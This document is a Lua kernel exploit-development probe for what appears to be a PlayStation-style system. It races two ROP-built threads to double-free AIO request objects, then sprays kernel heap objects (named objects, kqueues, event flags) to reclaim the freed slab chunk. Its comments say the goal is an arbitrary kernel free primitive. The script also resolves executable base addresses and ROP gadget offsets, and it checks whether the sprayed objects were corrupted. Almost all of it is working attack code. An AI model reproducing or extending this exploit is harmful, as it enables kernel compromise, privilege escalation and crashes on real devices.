-- CRASH_CLASS: HIGH
-- PROBE 65n: measure AIO kernel object size via double-free + spray
--
-- The double-free puts the same slab chunk on the freelist twice.
-- Strategy: trigger double-free, then spray with known-size objects
-- from different slab zones. The zone that "eats" the freed chunk
-- is the one that matches the AIO request object size.
--
-- Measurement approach:
-- 1. sys 624 counts VM ops (+5 per mmap). Use it to detect kernel
--    allocations/frees during AIO operations.
-- 2. After double-free, spray with pipe buffers (varying sizes via
--    write), then check if the freelist is corrupted (second alloc
--    from same zone will return the sprayed data).
-- 3. Use socketpair write with controlled data as spray primitive.
--
-- From Jose's analysis: after double-free, the second 662 call
-- "frees sub-objects of the attacker-swapped object". So the
-- exploitation path is:
--   a) Double-free AIO object
--   b) Spray to reclaim with controlled data
--   c) The "sub-object free" path in 662 reads pointers from our
--      controlled data and frees whatever they point to
--   → arbitrary kernel free primitive

print("=== PROBE 65n: AIO object size measurement ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- sys 624 VM op counter
local function get_vm_ops()
    local ok, rv = pcall(function() return mk(624)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then return N(rv) end
    return -1
end

-- AIO helpers
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- [A] Measure VM ops per AIO operation
print("")
print("[A] VM ops per AIO operation")
local v0 = get_vm_ops()
print(string.format("  baseline: %d", v0))

-- Submit 1
local v1 = get_vm_ops()
local id1 = submit_one()
local v2 = get_vm_ops()
print(string.format("  submit: delta=%d (id=0x%X)", v2 - v1, id1))

-- Poll 1
local v3 = get_vm_ops()
poll_one(id1)
local v4 = get_vm_ops()
print(string.format("  poll:   delta=%d", v4 - v3))

-- Delete 1
wd(N(one_id), id1); wd(N(one_st), 0xDEAD)
local v5 = get_vm_ops()
pcall(function()
    mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
end)
local v6 = get_vm_ops()
print(string.format("  delete: delta=%d (state=0x%X)", v6 - v5, rd(N(one_st)) or 0))

-- Submit 16
local v7 = get_vm_ops()
local batch_ids = {}
for i = 1, 16 do
    local id = submit_one()
    if id ~= 0 then table.insert(batch_ids, id) end
end
local v8 = get_vm_ops()
print(string.format("  submit×16: delta=%d (got %d)", v8 - v7, #batch_ids))

-- Poll 16
local v9 = get_vm_ops()
for _, id in ipairs(batch_ids) do poll_one(id) end
local v10 = get_vm_ops()
print(string.format("  poll×16:   delta=%d", v10 - v9))

-- Delete 16 (single 662 call)
local del_ids = memory.alloc(4 * 16 + 0x10)
local del_st = memory.alloc(4 * 16 + 0x10)
for i = 0, #batch_ids - 1 do
    wd(N(del_ids) + i * 4, batch_ids[i + 1])
    wd(N(del_st) + i * 4, 0xDEAD)
end
local v11 = get_vm_ops()
pcall(function()
    mk(662)(uint64(N(del_ids)), uint64(#batch_ids), uint64(N(del_st)))
end)
local v12 = get_vm_ops()
local del_ok = 0
for i = 0, #batch_ids - 1 do
    if rd(N(del_st) + i * 4) == 0 then del_ok = del_ok + 1 end
end
print(string.format("  delete×16: delta=%d (ok=%d/%d)", v12 - v11, del_ok, #batch_ids))

if not alive() then print("DEAD"); return end

-- [B] Measure VM ops for spray primitives
print("")
print("[B] VM ops per spray primitive")

-- socketpair
local sp_buf = memory.alloc(8)
local vb1 = get_vm_ops()
wd(N(sp_buf), 0); wd(N(sp_buf) + 4, 0)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf))) end)
local vb2 = get_vm_ops()
local sp_fd1 = rd(N(sp_buf)) or 0
local sp_fd2 = rd(N(sp_buf) + 4) or 0
print(string.format("  socketpair: delta=%d (fds=%d,%d)", vb2 - vb1, sp_fd1, sp_fd2))
pcall(function() mk(6)(uint64(sp_fd1)) end)
pcall(function() mk(6)(uint64(sp_fd2)) end)

-- namedobj
local vb3 = get_vm_ops()
local nname = put_str("vmops_test_001")
local ok, nrv = pcall(function() return mk(557)(uint64(N(nname)), uint64(1), uint64(0)) end)
local vb4 = get_vm_ops()
local nh = ok and N(nrv) or 0
print(string.format("  namedobj_create: delta=%d (h=0x%X)", vb4 - vb3, nh))
if nh > 0 then pcall(function() mk(558)(uint64(nh)) end) end
local vb5 = get_vm_ops()
print(string.format("  namedobj_delete: delta=%d", vb5 - vb4))

-- shm_open
local vb6 = get_vm_ops()
local sname = put_str("/vmops_shm_001")
local ok2, srv = pcall(function() return mk(482)(uint64(N(sname)), uint64(0x202), uint64(0x1FF)) end)
local vb7 = get_vm_ops()
local shm_fd = ok2 and sgn(srv) or -1
print(string.format("  shm_open: delta=%d (fd=%d)", vb7 - vb6, shm_fd))
if shm_fd >= 0 then pcall(function() mk(6)(uint64(shm_fd)) end) end

-- setsockopt (IP_OPTIONS)
wd(N(sp_buf), 0); wd(N(sp_buf) + 4, 0)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf))) end)
sp_fd1 = rd(N(sp_buf)) or 0
local opt_data = memory.alloc(0x100)
for i = 0, 0x3C, 4 do wd(N(opt_data) + i, 0x41414141 + i) end
local vb8 = get_vm_ops()
pcall(function() mk(105)(uint64(sp_fd1), uint64(0), uint64(1), uint64(N(opt_data)), uint64(40)) end)
local vb9 = get_vm_ops()
print(string.format("  setsockopt(IP_OPTIONS,40): delta=%d", vb9 - vb8))
pcall(function() mk(6)(uint64(sp_fd1)) end)
pcall(function() mk(6)(uint64(rd(N(sp_buf) + 4) or 0)) end)

-- kqueue
local vb10 = get_vm_ops()
local ok3, kqrv = pcall(function() return mk(362)() end)
local vb11 = get_vm_ops()
local kq_fd = ok3 and sgn(kqrv) or -1
print(string.format("  kqueue: delta=%d (fd=%d)", vb11 - vb10, kq_fd))
if kq_fd >= 0 then pcall(function() mk(6)(uint64(kq_fd)) end) end

if not alive() then print("DEAD"); return end

-- [C] Double-free + spray with socketpair write data
-- The idea: after double-free, the freed slab chunk is on the
-- freelist twice. First allocation reclaims it. The second
-- allocation gives the SAME pointer to someone else.
-- If we spray with socketpair send buffers (mbuf), kernel allocs
-- an mbuf to hold the data — if it lands in the same zone as the
-- AIO object, we control its contents.
print("")
print("[C] Double-free + socketpair mbuf spray")

local BATCH = 16
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

local function build_delete_child(del_ids_addr, count, states_buf)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(N(states_buf)))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- Submit + poll
local ids = {}
for i = 1, BATCH do
    local id = submit_one()
    if id ~= 0 then
        poll_one(id)
        table.insert(ids, id)
    end
end
print(string.format("  submitted %d", #ids))

local count = #ids
local race_ids = memory.alloc(4 * BATCH + 0x10)
for i = 0, count - 1 do
    wd(N(race_ids) + i * 4, ids[i + 1])
    wd(N(states_A) + i * 4, 0xAAAAAAAA)
    wd(N(states_B) + i * 4, 0xBBBBBBBB)
end

-- Trigger double-free
local par_A = build_delete_child(N(race_ids), count, states_A)
local par_B = build_delete_child(N(race_ids), count, states_B)
pcall(function() mk(455)(par_A, uint64(0x38)) end)
pcall(function() mk(455)(par_B, uint64(0x38)) end)
for w = 1, 50000 do local _ = rd(N(race_ids)) end

local double_count = 0
for i = 0, count - 1 do
    local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
    local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
    if sA == 0 and sB == 0 then double_count = double_count + 1 end
end
print(string.format("  double-frees: %d", double_count))

if not alive() then print("DEAD after race"); return end

-- Now spray: create socketpairs and write marker data
-- The write enqueues mbufs in the kernel socket buffer (different zone)
-- Also try: create many small kernel objects to hit the AIO slab
print("  spraying 256 namedobjs...")
local spray_handles = {}
for i = 1, 256 do
    local name = put_str(string.format("s_%06d", i))
    local ok4, rv4 = pcall(function() return mk(557)(uint64(N(name)), uint64(0xCAFE0000 + i), uint64(0)) end)
    if ok4 and N(rv4) > 0 then table.insert(spray_handles, N(rv4)) end
end
print(string.format("  created %d namedobjs", #spray_handles))

-- Also create kqueues (each one is a kernel kqueue struct)
print("  spraying 64 kqueues...")
local spray_kqs = {}
for i = 1, 64 do
    local ok5, rv5 = pcall(function() return mk(362)() end)
    if ok5 and sgn(rv5) >= 0 then table.insert(spray_kqs, sgn(rv5)) end
end
print(string.format("  created %d kqueues", #spray_kqs))

-- Also spray with evf_create (538) — these are Sony event flag objects
print("  spraying 128 evf objects...")
local spray_evf = {}
for i = 1, 128 do
    local ok6, rv6 = pcall(function() return mk(538)(uint64(0), uint64(0)) end)
    if ok6 and N(rv6) > 0 then table.insert(spray_evf, N(rv6)) end
end
print(string.format("  created %d evf objects", #spray_evf))

-- Now try to trigger the "free sub-objects" path:
-- Submit new AIO requests — if one lands in the freed-twice slot,
-- the kernel treats our spray data as an AIO request and reads
-- pointers from it for sub-object operations
print("")
print("[D] Post-spray AIO lifecycle")
local vd1 = get_vm_ops()
local post_ids = {}
for i = 1, 32 do
    local id = submit_one()
    if id ~= 0 then
        table.insert(post_ids, id)
    end
end
local vd2 = get_vm_ops()
print(string.format("  submitted %d new requests (vmops delta=%d)", #post_ids, vd2 - vd1))

-- Poll them
for _, id in ipairs(post_ids) do poll_one(id) end

-- Delete them — this is where the magic happens if a request
-- landed in the freed-twice slot. The delete would read pointers
-- from our controlled data
local post_del = memory.alloc(4 * #post_ids + 0x10)
local post_st = memory.alloc(4 * #post_ids + 0x10)
for i = 0, #post_ids - 1 do
    wd(N(post_del) + i * 4, post_ids[i + 1])
    wd(N(post_st) + i * 4, 0xDEAD)
end
local vd3 = get_vm_ops()
pcall(function()
    mk(662)(uint64(N(post_del)), uint64(#post_ids), uint64(N(post_st)))
end)
local vd4 = get_vm_ops()
local post_ok = 0
for i = 0, #post_ids - 1 do
    if rd(N(post_st) + i * 4) == 0 then post_ok = post_ok + 1 end
end
print(string.format("  deleted %d/%d (vmops delta=%d)", post_ok, #post_ids, vd4 - vd3))

if not alive() then
    print("*** CRASHED during post-spray delete — UAF is exploitable! ***")
end

-- [E] Check if any spray objects were corrupted
print("")
print("[E] Spray object integrity check")
-- Try to delete the namedobj handles — if any fail or crash,
-- the slab is corrupted
local nobj_corrupt = 0
for i, h in ipairs(spray_handles) do
    local ok7, rv7 = pcall(function() return mk(558)(uint64(h)) end)
    if not ok7 then
        nobj_corrupt = nobj_corrupt + 1
        if nobj_corrupt <= 5 then
            print(string.format("  namedobj handle 0x%X: PCALL FAIL", h))
        end
    else
        local ret = sgn(rv7)
        if ret ~= 0 then
            nobj_corrupt = nobj_corrupt + 1
            if nobj_corrupt <= 5 then
                print(string.format("  namedobj handle 0x%X: ret=%d (CORRUPTION?)", h, ret))
            end
        end
    end
end
print(string.format("  namedobj corruption: %d/%d", nobj_corrupt, #spray_handles))

-- Close kqueues
local kq_corrupt = 0
for _, fd in ipairs(spray_kqs) do
    local ok8, rv8 = pcall(function() return mk(6)(uint64(fd)) end)
    if not ok8 or sgn(rv8) ~= 0 then kq_corrupt = kq_corrupt + 1 end
end
print(string.format("  kqueue corruption: %d/%d", kq_corrupt, #spray_kqs))

-- Delete evf
local evf_corrupt = 0
for _, h in ipairs(spray_evf) do
    local ok9, rv9 = pcall(function() return mk(539)(uint64(h)) end)
    if not ok9 then evf_corrupt = evf_corrupt + 1 end
end
print(string.format("  evf corruption: %d/%d", evf_corrupt, #spray_evf))

print("")
print("[F] SUMMARY")
print(string.format("  double-frees:     %d", double_count))
print(string.format("  namedobj corrupt: %d/%d", nobj_corrupt, #spray_handles))
print(string.format("  kqueue corrupt:   %d/%d", kq_corrupt, #spray_kqs))
print(string.format("  evf corrupt:      %d/%d", evf_corrupt, #spray_evf))
print(string.format("  process:          %s", alive() and "ALIVE" or "DEAD"))

print("")
print("=== 65n COMPLETE ===")
